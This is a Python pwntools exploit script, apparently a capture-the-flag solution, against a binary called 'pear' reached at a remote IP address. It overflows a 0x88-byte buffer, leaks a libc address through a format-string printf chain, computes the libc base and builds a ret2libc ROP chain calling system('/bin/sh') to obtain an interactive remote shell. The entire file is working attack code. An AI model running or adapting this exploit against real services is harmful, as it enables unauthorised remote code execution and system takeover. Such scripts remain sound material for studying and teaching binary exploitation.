from pwn import *
local = False

# context(os='linux', arch='amd64', log_level='debug')
elf = ELF("./pear")


if local:
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    libc_gadget = 0x2a145
else:
    libc = ELF("./libc.so.6")
    libc_gadget = 0x10f75b

libc_system = libc.symbols['system']

printf = elf.plt['printf']
gets = elf.plt['gets']
main = elf.symbols['main']
offset_relative_addr = libc.symbols['_IO_2_1_stdin_']
print("offset_relative_addr:" + hex(offset_relative_addr))


if local:
    r = process("./pear")
else:
    r = remote("65.109.198.121", 5000)

payload = b"A" * 0x88 + p64(gets) + p64(gets) + p64(gets) + p64(printf) + p64(main)
r.recvuntil(b"Please Enter your name: ")
r.sendline(payload)
r.recvline()
r.sendline(b'')
r.sendline(b'AAAA')
r.sendline(b'%p%p$%p#' + p64(0))
r.recvuntil(b'#0x')
offset_real_addr = int(r.recvuntil(b'#').replace(b'#', b'').decode(), 16)
print("offset_real_addr:" + hex(offset_real_addr))
libc_base = offset_real_addr - offset_relative_addr
system_addr = libc_base + libc_system
pop_rdi_ret = libc_base + libc_gadget
binsh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
print("system_addr:" + hex(system_addr))
print("pop_rdi_ret:" + hex(pop_rdi_ret))
print("binsh_addr:" + hex(binsh_addr))
payload = b'A'*0x88
payload += p64(pop_rdi_ret)
payload += p64(binsh_addr)
# payload += p64(libc_base + libc.symbols['puts']) # 验证libc_base正确性，预期打印/bin/sh
payload += p64(system_addr)
r.recvuntil(b"Please Enter your name: ")
r.sendline(payload)
r.recvline()
r.interactive()
